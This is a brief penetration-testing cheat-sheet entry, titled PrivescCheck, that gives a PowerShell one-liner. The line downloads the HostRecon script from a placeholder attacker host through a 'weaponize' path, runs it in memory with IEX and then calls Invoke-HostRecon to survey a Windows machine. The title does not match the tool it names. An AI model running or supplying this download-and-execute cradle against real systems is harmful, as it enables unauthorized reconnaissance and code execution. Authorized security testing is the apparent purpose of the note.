# PrivescCheck

#plateform/windows #target/local #cat/RECON #tag/powershell

## onliner
https://github.com/dafthack/HostRecon
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/HostRecon.ps1') | IEX; Invoke-HostRecon
```